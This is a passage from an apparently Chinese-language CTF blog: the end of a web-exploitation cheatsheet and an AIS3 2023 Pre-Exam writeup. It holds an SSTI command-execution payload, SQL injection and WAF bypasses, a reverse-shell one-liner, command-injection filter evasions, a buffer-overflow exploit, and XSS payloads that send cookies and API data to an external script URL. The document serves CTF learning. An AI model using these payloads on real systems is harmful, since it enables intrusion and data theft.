class="string">[].__class__.__base__.__subclasses__()[132].__init__.__globals__ =&gt;返回所有可被global調用的method</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#123;&#123;[].__class__.__base__.__subclasses__()[132].__init__.__globals__[&#x27;</span>system<span class="string">&#x27;](&#x27;</span>ls<span class="string">&#x27;)&#125;&#125;</span></span><br><span class="line"><span class="string">#os.system被A出來了</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#123;&#123;[].__class__.__base__.__subclasses__()[132].__init__.__globals__[&#x27;</span>popen<span class="string">&#x27;](&#x27;</span>ls<span class="string">&#x27;).read()&#125;&#125;</span></span><br><span class="line"><span class="string">#回傳結果</span></span><br></pre></td></tr></table></figure>

<p>更多奇技淫巧:<a target="_blank" rel="noopener" href="https://tw511.com/a/01/48066.html">https://tw511.com/a/01/48066.html</a></p>
<h2 id="SQL-injection"><a href="#SQL-injection" class="headerlink" title="SQL injection"></a>SQL injection</h2><p><a target="_blank" rel="noopener" href="https://www.796t.com/content/1545706659.html">https://www.796t.com/content/1545706659.html</a><br><a target="_blank" rel="noopener" href="https://zu1k.com/posts/security/web-security/bypass-tech-for-sql-injection-keyword-filtering/">https://zu1k.com/posts/security/web-security/bypass-tech-for-sql-injection-keyword-filtering/</a></p>
<h3 id="Comments"><a href="#Comments" class="headerlink" title="Comments"></a>Comments</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">MySQL</span><br><span class="line">#comment</span><br><span class="line">-- comment     [Note the space after the double dash]</span><br><span class="line">/*comment*/</span><br><span class="line">/*! MYSQL Special SQL */</span><br><span class="line"></span><br><span class="line">PostgreSQL</span><br><span class="line">--comment</span><br><span class="line">/*comment*/</span><br><span class="line"></span><br><span class="line">MSQL</span><br><span class="line">--comment</span><br><span class="line">/*comment*/</span><br><span class="line"></span><br><span class="line">Oracle</span><br><span class="line">--comment</span><br><span class="line"></span><br><span class="line">SQLite</span><br><span class="line">--comment</span><br><span class="line">/*comment*/</span><br><span class="line"></span><br><span class="line">HQL</span><br><span class="line">HQL does not support Comments</span><br></pre></td></tr></table></figure>



<h3 id="常見waf"><a href="#常見waf" class="headerlink" title="常見waf"></a>常見waf</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">escape</span>()<span class="operator">-</span><span class="operator">&gt;</span>被轉成<span class="operator">%</span>XX，@<span class="operator">*</span> _ <span class="operator">+</span> <span class="operator">-</span> . <span class="operator">/</span>不編碼</span><br></pre></td></tr></table></figure>

<h3 id="waf繞過"><a href="#waf繞過" class="headerlink" title="waf繞過"></a>waf繞過</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&#x27;弄不出來的時候可以嘗試兩個urlencode合在一起</span><br><span class="line">%bf%27、%df%27、%aa%27</span><br></pre></td></tr></table></figure>

<h2 id="Reversed-Shell"><a href="#Reversed-Shell" class="headerlink" title="Reversed Shell"></a>Reversed Shell</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">最經典</span><br><span class="line">nc -klvp [port] <span class="comment">#attacker&#x27;s host</span></span><br><span class="line">/bin/sh -i &gt;&amp; /dev/tcp/[host]/[port] 0&lt;&amp;1 <span class="comment">#victim</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="Commandline-Injection"><a href="#Commandline-Injection" class="headerlink" title="Commandline Injection"></a>Commandline Injection</h2><h3 id="截斷指令"><a href="#截斷指令" class="headerlink" title="截斷指令"></a>截斷指令</h3><p>最基本的截斷可用<code>;</code>達成，也可使用</p>
<ul>
<li><code>cmd1&amp;&amp;cmd2</code>當<code>cmd1</code> 執行成功時執行<code>cmd2</code></li>
<li><code>cmd1&amp;cmd2</code>簡單拼接，無論<code>cmd1</code>執行成功與否都會執行<code>cmd2</code></li>
<li><code>cmd1||cmd2</code>當<code>cmd1</code>執行失敗時執行&#96;cmd2</li>
<li><code>cmd1|cmd2</code>將<code>cmd1</code>的執行結果以pipeline塞給<code>cmd2</code></li>
</ul>
<h3 id="空格繞過"><a href="#空格繞過" class="headerlink" title="空格繞過"></a>空格繞過</h3><ul>
<li>使用<code>&lt;&gt;</code>繞過<ul>
<li><code>cat&lt;flag</code></li>
<li><code>cat&lt;&gt;flag</code></li>
</ul>
</li>
<li><code>&#123;cat,flag&#125;</code></li>
<li>使用特殊變量<code>$IFS</code>繞過(預設是空格)<ul>
<li><code>cat$IFS./flag</code></li>
<li><code>cat$IFS\flag</code></li>
</ul>
</li>
</ul>
<h3 id="過濾繞過"><a href="#過濾繞過" class="headerlink" title="過濾繞過"></a>過濾繞過</h3><ul>
<li>regex繞過<ul>
<li><code>/usr/bin/ca? flag</code></li>
</ul>
</li>
<li>反斜線繞過<ul>
<li><code>ca\t fl\ag</code></li>
</ul>
</li>
<li>空變量繞過<ul>
<li><code>ca$&#123;Z&#125;t flag</code></li>
</ul>
</li>
</ul>
<h3 id="一些猛料"><a href="#一些猛料" class="headerlink" title="一些猛料"></a>一些猛料</h3><blockquote>
<p><a target="_blank" rel="noopener" href="https://www.zhihu.com/tardis/zm/art/339266206?source_id=1003">https://www.zhihu.com/tardis/zm/art/339266206?source_id=1003</a><br><a target="_blank" rel="noopener" href="https://blog.csdn.net/m0_61011147/article/details/126722464">https://blog.csdn.net/m0_61011147/article/details/126722464</a></p>
</blockquote>
<h2 id="一些會一直旺季的東東"><a href="#一些會一直旺季的東東" class="headerlink" title="一些會一直旺季的東東"></a>一些會一直旺季的東東</h2><p><img src="/2024/04/30/CTF-Cheatsheet-Web/3.png"></p>
<p><img src="/2024/04/30/CTF-Cheatsheet-Web/4.gif"></p>
<h2 id="更多筆記"><a href="#更多筆記" class="headerlink" title="更多筆記"></a>更多筆記</h2><p><a target="_blank" rel="noopener" href="https://github.com/splitline/How-to-Hack-Websites">https://github.com/splitline/How-to-Hack-Websites</a></p>
<p><a target="_blank" rel="noopener" href="https://github.com/splitline/My-CTF-Challenges/">https://github.com/splitline/My-CTF-Challenges/</a></p>
<p><a target="_blank" rel="noopener" href="https://medium.com/%E8%B3%87%E5%AD%90%E4%B9%8B%E6%89%8B-%E5%AE%89%E4%B9%8B%E4%BD%A0%E6%88%91/%E8%B3%87%E5%AE%89%E6%96%B0%E6%89%8B%E5%85%A5%E9%96%80%E6%89%8B%E5%86%8A-web-security-%E9%A0%98%E8%88%AA%E4%B9%8B%E8%B7%AF-8d634d9228b5">[資安新手入門手冊] Web Security 領航之路</a></p>
<p><a target="_blank" rel="noopener" href="https://ctf-wiki.org/">简介 - CTF Wiki</a></p>
<p><a target="_blank" rel="noopener" href="https://edu-ctf.csie.org/"></a></p>
<p><a target="_blank" rel="noopener" href="https://github.com/w181496/Web-CTF-Cheatsheet">https://github.com/w181496/Web-CTF-Cheatsheet</a></p>
</div></article></div><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item"><time dateTime="2024-02-07T07:24:52.000Z" title="2024/2/7 下午3:24:52">2024-02-07</time>發表</span><span class="level-item"><time dateTime="2024-06-30T06:21:01.438Z" title="2024/6/30 下午2:21:01">2024-06-30</time>更新</span><span class="level-item"><a class="link-muted" href="/categories/CTF/">CTF</a></span><span class="level-item">11 分鐘讀完 (大約1637個字)</span></div></div><p class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2024/02/07/2023-AIS3-Pre-Exam-writeup/">2023 AIS3 Pre-Exam writeup</a></p><div class="content"><h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="Welcome"><a href="#Welcome" class="headerlink" title="Welcome"></a>Welcome</h2><pre><code>Are you not a robot ?
FLAG Format: ^AIS3&#123;[A-Z0-9+-*/!?-]+&#125;$

Author: nella17
</code></pre>
<p>點開pdf，flag直接寫在上面了，一開始以為-是_結果浪費一堆時間</p>
<blockquote>
<p>AIS3{WELC0ME-T0-2023-PRE-EXAM-&amp;-MY-FIRST-CTF}</p>
</blockquote>
<h2 id="Robot"><a href="#Robot" class="headerlink" title="Robot"></a>Robot</h2><pre><code>Are you a robot?

Note: This is NOT a reversing or pwn challenge. Don&#39;t reverse the 
binary. It is for local testing only. You will actually get the flag 
after answering all the questions. You can practice locally by running 
./robot AIS3&#123;fake_flag&#125; 127.0.0.1 1234 and it will run the service on 
localhost:1234.

Author: toxicpie

nc chals1.ais3.org 12348
</code></pre>
<p>機器人會問你三十題數學，可以直接寫Python用eval()解<br>在discord看到有人說直接用手解，牛皮</p>
<h3 id="exploit-code"><a href="#exploit-code" class="headerlink" title="exploit code"></a>exploit code</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pwn</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">io=pwn.remote(<span class="string">&quot;chals1.ais3.org&quot;</span>,<span class="number">12348</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(io.recvuntil(<span class="string">&quot;!&quot;</span>))</span><br><span class="line">time.sleep(<span class="number">0.5</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">30</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;solving..<span class="subst">&#123;i+<span class="number">1</span>&#125;</span>&quot;</span>)</span><br><span class="line">    string=io.recv().decode()</span><br><span class="line">    string=string.strip(<span class="string">&quot; &quot;</span>).strip(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(string,<span class="built_in">eval</span>(string))</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(<span class="built_in">eval</span>(string)))</span><br><span class="line">    time.sleep(<span class="number">0.5</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
<p><img src="https://hackmd.io/_uploads/rkpBv0QHh.png"></p>
<blockquote>
<p>AIS3{don’t_eval_unknown_code_or_pipe_curl_to_sh}<br>被罵了</p>
</blockquote>
<h1 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h1><h2 id="Simply-Pwn"><a href="#Simply-Pwn" class="headerlink" title="Simply Pwn"></a>Simply Pwn</h2><pre><code>The simplest pwn

nc chals1.ais3.org 11111
</code></pre>
<p>經典buffer overflow</p>
<h3 id="先用gdb觀察"><a href="#先用gdb觀察" class="headerlink" title="先用gdb觀察"></a>先用gdb觀察</h3><p>ni到read附近</p>
<p><img src="https://hackmd.io/_uploads/H1wvwAmHh.png"></p>
<p>可以發現輸入變數存在<strong>rsi&#x3D;rbp-0x50+0x9&#x3D;rbp-0x47</strong></p>
<p>所以必須墊<strong>0x47+8byte(RSP)+address</strong>，剛好可以覆蓋return address</p>
<p><img src="https://hackmd.io/_uploads/ryndPC7S2.png"></p>
<p>直接讓程式跳到shellcode</p>
<h3 id="exploit-code-1"><a href="#exploit-code-1" class="headerlink" title="exploit code"></a>exploit code</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pwn</span><br><span class="line">io=pwn.remote(<span class="string">&quot;chals1.ais3.org&quot;</span>,<span class="number">11111</span>)</span><br><span class="line">payload=<span class="string">b&quot;a&quot;</span>*(<span class="number">0x4f</span>)+pwn.p64(<span class="number">0x4017a5</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<blockquote>
<p>AIS3{5imP1e_Pwn_4_beGinn3rs!}</p>
</blockquote>
<h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="Login-Panel"><a href="#Login-Panel" class="headerlink" title="Login Panel"></a>Login Panel</h2><pre><code>Login Panel 網站採用了隱形 reCAPTCHA 作為防護機制，以確保只有人類的使用者能夠登入
admin 的帳號。你的任務是找到一個方法來繞過 reCAPTCHA，成功登入 admin 的帳號。

你可以使用各種技術和手段來達成目標，可能需要進行一些網站分析、程式碼解讀或其他形式的
攻擊。請注意，你需要遵守道德規範，不得進行任何非法或有害的行為。

當你成功登入 admin 的帳號後，你將能夠獲得 FLAG。請將 FLAG 提交至挑戰平台，以證明
你的成功。

Author: Ching367436

http://chals1.ais3.org:8000/
</code></pre>
<p>直接讀source code</p>
<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">db.<span class="title function_">get</span>(<span class="string">`SELECT * FROM Users WHERE username = &#x27;<span class="subst">$&#123;username&#125;</span>&#x27; AND password = &#x27;<span class="subst">$&#123;password&#125;</span>&#x27;`</span></span><br></pre></td></tr></table></figure>

<p>聞起來就很有SQL injection的味道</p>
<h3 id="Bypass-Login-Page"><a href="#Bypass-Login-Page" class="headerlink" title="Bypass Login Page"></a>Bypass Login Page</h3><p>注入<strong>username</strong></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username<span class="operator">=</span><span class="string">&#x27; or &#x27;</span>a<span class="string">&#x27;=&#x27;</span>a</span><br></pre></td></tr></table></figure>
<p>中計直接被Redirect到rickroll</p>
<p><strong>ok不然改注password</strong></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username<span class="operator">=</span>admin<span class="operator">&amp;</span>password<span class="operator">=</span><span class="string">&#x27; or &#x27;</span>a<span class="string">&#x27;=&#x27;</span>a</span><br></pre></td></tr></table></figure>

<p>成功進入之後還有2fa認證，要輸入2fa code才能進到dashboard看flag，但是仔細看其實驗證完之後他也只是redirect到&#x2F;dashboard而已，所以直接存取&#x2F;dashboard即可</p>
<blockquote>
<p>AIS3{‘ UNION SELECT 1, 1, 1, 1 WHERE ({condition})–}</p>
</blockquote>
<h2 id="E-Portfolio-baby"><a href="#E-Portfolio-baby" class="headerlink" title="E-Portfolio baby"></a>E-Portfolio baby</h2><pre><code>AIS3 E-Portfolio 是一個學習成就展示平台，讓使用者可以建立並分享他們在 AIS3 的學習成果和專
案作品。其中，網站提供了一個「Share your portfolio with admin」的功能，讓使用者可以將自
己的作品集分享給管理員。

你需要找出一個前端漏洞，當你分享作品集給管理員時，能夠竊取 admin 的旗幟。你可以透過探索網站
的前端程式碼，找到適當的方式來觸發漏洞並取得旗幟。

請注意，你需要在漏洞設計中保持合法並遵循道德原則。請勿以任何方式傷害網站的正常運作或使用者的隱私。

對了，按下「Share your portfolio with admin」的按鈕的時候，admin 會去拜訪的頁面會是
http://url/share?username=&#123;按下那個按鈕的使用者名稱&#125;。

Author: Ching367436

http://chals1.ais3.org:8880/
</code></pre>
<p>看到share to admin就知道這是csrf題目<br>先戳戳看</p>
<h3 id="測試XSS"><a href="#測試XSS" class="headerlink" title="測試XSS"></a>測試XSS</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert()&lt;/script&gt;</span><br></pre></td></tr></table></figure>
<p>沒反應，因為寫上文字是使用innerHTML，所以對 <strong>&lt;script&gt;</strong> 標籤不起作用</p>
<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (data.<span class="property">success</span>) &#123;</span><br><span class="line">                        username.<span class="property">innerHTML</span> = data.<span class="property">data</span>.<span class="property">username</span></span><br><span class="line">                        about.<span class="property">innerHTML</span> = data.<span class="property">data</span>.<span class="property">about</span></span><br><span class="line">                        avatar.<span class="property">src</span> = data.<span class="property">data</span>.<span class="property">avatar</span></span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        <span class="title function_">alert</span>(data.<span class="property">message</span>)</span><br><span class="line">                    &#125;</span><br></pre></td></tr></table></figure>
<p>用 <strong>&lt;img src&gt;</strong> 試試</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;123&quot; onerror=alert()&gt;</span><br></pre></td></tr></table></figure>
<p><img src="https://hackmd.io/_uploads/rkAxgsVH2.png"><br>果然出現XSS</p>
<h3 id="嘗試當cookie小偷"><a href="#嘗試當cookie小偷" class="headerlink" title="嘗試當cookie小偷"></a>嘗試當cookie小偷</h3><p><strong>一開始的思路是當cookie小偷，然後用admin登入看flag藏在哪</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&#x27;&#x27; onerror=fetch(&#x27;https://script.google.com/macros/s/\</span><br><span class="line">                           AKfycbxFRZIq7zd9X5gpd9MNCIe9m6d_GwrT3kY9vkVH8hPXic7pbr-\</span><br><span class="line">                           pW0B8vTj0lureCaOdOA/exec?\</span><br><span class="line">                           text=cookie:&#x27;+encodeURI(document.cookie))&gt;</span><br></pre></td></tr></table></figure>
<p><img src="https://hackmd.io/_uploads/B1syQsNBn.png"><br>因為有設定HTTP only所以偷不到cookie(後來發現偷到也沒用，flag不在admin的頁面裡面)</p>
<h3 id="嘗試直接偷api內容"><a href="#嘗試直接偷api內容" class="headerlink" title="嘗試直接偷api內容"></a>嘗試直接偷api內容</h3><p>看sauce code會發現其實flag寫在admin的密碼裡面，然後密碼又透過api&#x2F;portfolio傳遞<br><img src="https://hackmd.io/_uploads/ByImUsEB3.png"></p>
<p>ok開偷</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;123&quot; onerror=&quot;fetch(&#x27;api/portfolio&#x27;)</span><br><span class="line">      .then(response =&gt;response.text()).then(text=&gt;&#123;</span><br><span class="line">        var url=</span><br><span class="line">            &#x27;https://script.google.com/macros/s/\</span><br><span class="line">            AKfycbxFRZIq7zd9X5gpd9MNCIe9m6d_GwrT3kY9vkVH8hPXic7pbr-\</span><br><span class="line">            pW0B8vTj0lureCaOdOA/exec?text=&#x27;</span><br><span class="line">        fetch(url+encodeURI(text))</span><br><span class="line">      &#125;)&quot;&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><img src="https://hackmd.io/_uploads/S19GtoVrh.png"><br>在瀏覽器上測試成功，但share to admin甚麼事都沒發生</p>
<p><img src="https://hackmd.io/_uploads/HkNT5jNrh.png"><br>網站沒有設定CSP，所以應該是機器人沒辦法訪問外網</p>
<h3 id="嘗試寫入自己的page"><a href="#嘗試寫入自己的page" class="headerlink" title="嘗試寫入自己的page"></a>嘗試寫入自己的page</h3><p>沒辦法直接用webhook就變很複雜了</p>
<p><strong>改變絲路:</strong><br>偷到api&#x2F;portfolio-&gt;登入自己的帳號-&gt;寫入textarea-&gt;儲存</p>
<p><em><strong>創建登入form</strong></em></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;form id=form action=&quot;/api/login&quot; method=&quot;post&quot; target=&quot;_blank&quot;&gt;</span><br><span class="line">    &lt;input name=&quot;username&quot; value=&quot;test123&quot;&gt;</span><br><span class="line">    &lt;input name=&quot;password&quot; value=&quot;test&quot;&gt;</span><br><span class="line">&lt;/form&gt;</span><br></pre></td></tr></table></figure>
<p><em><strong>先偷api&#x2F;portfolio再submit表單切成自己帳號，最後改textarea、click save</strong></em></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;123&quot; onerror=&quot;fetch(&#x27;http://web:8000/api/portfolio&#x27;)</span><br><span class="line">      .then(response =&gt;response.text()).then(text=&gt;&#123;</span><br><span class="line">        form.submit()</span><br><span class="line">        setTimeout(function() &#123;</span><br><span class="line">        console.log(&#x27;123&#x27;);</span><br><span class="line">        &#125;, 1000);    </span><br><span class="line">        var win=window.open(&#x27;http://web:8000/portfolio&#x27;)</span><br><span class="line">        setTimeout(() =&gt; &#123;</span><br><span class="line">        win.document.querySelector(&#x27;textarea[id=about]&#x27;).value = text;</span><br><span class="line">        win.document.querySelector(&#x27;button[id=save]&#x27;).click()</span><br><span class="line">    &#125;, 1000)</span><br><span class="line">      &#125;)&quot;&gt;</span><br></pre></td></tr></table></figure>
<p><img src="https://hackmd.io/_uploads/HJDHTiNSn.png"></p>
<blockquote>
<p>AIS3{&lt;img src&#x3D;x onerror&#x3D;’fetch(…}</p>
</blockquote>
<h1 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h1><h2 id="Simply-Reverse"><a href="#Simply-Reverse" class="headerlink" title="Simply Reverse"></a>Simply Reverse</h2><pre><code>Just reverse it!
</code></pre>
<h3 id="先執行看看"><a href="#先執行看看" class="headerlink" title="先執行看看"></a>先執行看看</h3><p><img src="https://hackmd.io/_uploads/B10RnhEr2.png"></p>
<p><img src="https://hackmd.io/_uploads/S1kMT2NSh.png"></p>
<h3 id="丟ghidra"><a href="#丟ghidra" class="headerlink" title="丟ghidra"></a>丟ghidra</h3><p><img src="https://hackmd.io/_uploads/ryusahEB3.png"><br>這邊有一個verify函式判斷key是否正確</p>
<h3 id="解題絲路"><a href="#解題絲路" class="headerlink" title="解題絲路"></a>解題絲路</h3><pre><code>因為verify()的迴圈每跑一圈就會檢查一個char，一直到local_c=0x22 然後return true;
所以可以brute force 跑每個字元然後看迴圈有沒有炸掉
</code></pre>
<h3 id="exploit-code-2"><a href="#exploit-code-2" class="headerlink" title="exploit code"></a>exploit code</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pwn</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">io=pwn.process(<span class="string">&quot;gdb&quot;</span>)</span><br><span class="line">io.sendline(<span class="string">&quot;file rev&quot;</span>)</span><br><span class="line">io.sendline(<span class="string">&quot;start&quot;</span>)</span><br><span class="line">io.sendline(<span class="string">&quot;b *0x5555555551fb&quot;</span>)    <span class="comment">#把breakpoint 設在迴圈裏面，如果沒有停代表是錯的</span></span><br><span class="line">io.recvrepeat(timeout=<span class="number">1</span>)</span><br><span class="line">flag=<span class="string">&quot;AIS3&#123;&quot;</span></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x20</span>,<span class="number">0x7E</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;trying..&quot;</span>,flag+<span class="built_in">chr</span>(i))</span><br><span class="line">        io.sendline(<span class="string">f&quot;set args <span class="subst">&#123;flag+<span class="built_in">chr</span>(i)&#125;</span>&quot;</span>)</span><br><span class="line">        io.sendline(<span class="string">&quot;run&quot;</span>)</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(flag)+<span class="number">1</span>):</span><br><span class="line">            io.sendline(<span class="string">&quot;c&quot;</span>)</span><br><span class="line">        io.recvrepeat(timeout=<span class="number">0.3</span>).decode()</span><br><span class="line">        io.sendline(<span class="string">&quot;x/x $rbp-0x4&quot;</span>)</span><br><span class="line">        string=io.recv().decode()</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;No&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> string:</span><br><span class="line">            flag+=<span class="built_in">chr</span>(i)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    </span><br></pre></td></tr></table></figure>
<blockquote>
<p>AIS3{0ld_Ch@1_R3V1_fr@m_AIS32016!}</p>
</blockquote>
<h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="Fernet"><a href="#Fernet" class="headerlink" title="Fernet"></a>Fernet</h2><pre><code>你所在的公司最近發生了一起駭客入侵事件，管理員發現駭客使用 Fernet 密碼學來加密了他們的敏感數據。
你需要解開被加密的檔案，否則事情就大條了！

flag format : FLAG&#123;xxx&#125;

Auther : Richard ( dogxxx)
</code></pre>
<h3 id="看code"><a href="#看code" class="headerlink" title="看code"></a>看code</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> cryptography.fernet <span class="keyword">import</span> Fernet</span><br><span class="line"><span class="keyword">from</span> Crypto.Hash <span class="keyword">import</span> SHA256</span><br><span class="line"><span class="keyword">from</span> Crypto.Protocol.KDF <span class="keyword">import</span> PBKDF2</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> FLAG</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">plaintext, password</span>):</span><br><span class="line">    salt = os.urandom(<span class="number">16</span>)  </span><br><span class="line">    key = PBKDF2(password.encode(), salt, <span class="number">32</span>, count=<span class="number">1000</span>, hmac_hash_module=SHA256)  </span><br><span class="line">    f = Fernet(base64.urlsafe_b64encode(key))  </span><br><span class="line">    ciphertext = f.encrypt(plaintext.encode())  </span><br><span class="line">    <span class="keyword">return</span> base64.b64encode(salt + ciphertext).decode()</span><br><span class="line"></span><br><span class="line"><span class="comment"># Usage:</span></span><br><span class="line">leak_password = <span class="string">&#x27;mysecretpassword&#x27;</span></span><br><span class="line">plaintext = FLAG</span><br><span class="line"></span><br><span class="line"><span class="comment"># Encrypt</span></span><br><span class="line">ciphertext = encrypt(plaintext, leak_password)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Encrypted data:&quot;</span>,ciphertext)</span><br></pre></td></tr></table></figure>
<h3 id="絲路"><a href="#絲路" class="headerlink" title="絲路"></a>絲路</h3><pre><code>密碼都給你了所以反著解密就好了
</code></pre>
<p>加密流程是:產生salt-&gt;產生key-&gt;用key加密flag-&gt;把salt+ciphertext用base64 encode起來<br>所以其實salt也給你了就是base64 decode後的前16個char</p>
<h3 id="decrypt-code"><a href="#decrypt-code" class="headerlink" title="decrypt code"></a>decrypt code</h3><p>解密流程:base64 decode-&gt;取得salt、ciphertext-&gt;用password、salt重建key-&gt;用key解密ciphertext</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> cryptography.fernet <span class="keyword">import</span> Fernet</span><br><span class="line"><span class="keyword">from</span> Crypto.Hash 